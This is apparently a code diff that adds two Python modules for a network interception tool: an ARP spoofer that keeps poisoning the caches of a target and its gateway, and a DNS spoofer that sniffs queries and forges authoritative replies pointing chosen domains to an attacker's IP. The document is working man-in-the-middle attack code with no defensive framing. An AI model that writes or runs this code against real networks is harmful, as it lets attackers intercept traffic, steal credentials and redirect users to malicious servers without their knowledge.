@@ -1,0 +1,104 @@
+1. src/modules/arp_spoof.py
+
+from scapy.all import *
+from scapy.layers.l2 import ARP
+from threading import Thread, Event
+import time
+
+class ARPSpoofer:
+    def __init__(self, target_ip, gateway_ip, interface, logger):
+        self.target_ip = target_ip
+        self.gateway_ip = gateway_ip
+        self.interface = interface
+        self.logger = logger
+        self.stop_event = Event()
+        self.target_mac = None
+        self.gateway_mac = None
+    
+    def start(self):
+        """Start ARP spoofing"""
+        try:
+            self.target_mac = NetworkUtils.get_mac(self.target_ip)
+            self.gateway_mac = NetworkUtils.get_mac(self.gateway_ip)
+        except Exception as e:
+            self.logger.error(str(e))
+            return False
+        
+        self.logger.info(f"Starting ARP spoofing {self.target_ip} <-> {self.gateway_ip}")
+        
+        # Start spoofing in separate thread
+        spoof_thread = Thread(target=self._spoof_loop)
+        spoof_thread.daemon = True
+        spoof_thread.start()
+        return True
+    
+    def _spoof_loop(self):
+        """Continuous ARP spoofing"""
+        while not self.stop_event.is_set():
+            try:
+                # Poison target
+                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac), verbose=0)
+                # Poison gateway
+                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac), verbose=0)
+                time.sleep(2)
+            except Exception as e:
+                self.logger.error(f"ARP spoof error: {e}")
+                break
+    
+    def stop(self):
+        """Stop ARP spoofing and restore network"""
+        self.stop_event.set()
+        self.logger.info("Restoring ARP tables...")
+        try:
+            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac), count=5, verbose=0)
+            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=5, verbose=0)
+        except Exception as e:
+            self.logger.error(f"Failed to restore ARP: {e}")
+
+
+2. src/modules/dns_spoof.py
+
+from scapy.all import *
+from scapy.layers.dns import DNS, DNSQR, DNSRR
+from scapy.layers.inet import IP, UDP
+import threading
+
+class DNSSpoofer:
+    def __init__(self, dns_mappings, interface, logger):
+        self.dns_mappings = dns_mappings  # {'example.com': '192.168.1.100'}
+        self.interface = interface
+        self.logger = logger
+        self.stop_event = threading.Event()
+    
+    def start(self):
+        """Start DNS spoofing"""
+        self.logger.info("Starting DNS spoofer...")
+        sniff_thread = threading.Thread(target=self._sniff_dns)
+        sniff_thread.daemon = True
+        sniff_thread.start()
+        return True
+    
+    def _sniff_dns(self):
+        """Sniff for DNS requests"""
+        sniff(filter="udp port 53", iface=self.interface, prn=self._process_dns, stop_filter=lambda x: self.stop_event.is_set())
+    
+    def _process_dns(self, packet):
+        """Process DNS requests and send spoofed responses"""
+        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:  # DNS query
+            domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
+            
+            if domain in self.dns_mappings:
+                self.logger.info(f"Intercepting DNS request for {domain}")
+                
+                spoofed_ip = self.dns_mappings[domain]
+                spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
+                               UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+                               DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,\
+                                   an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
+                
+                send(spoofed_pkt, verbose=0)
+    
+    def stop(self):
+        """Stop DNS spoofing"""
+        self.stop_event.set()
+        self.logger.info("DNS spoofer stopped")
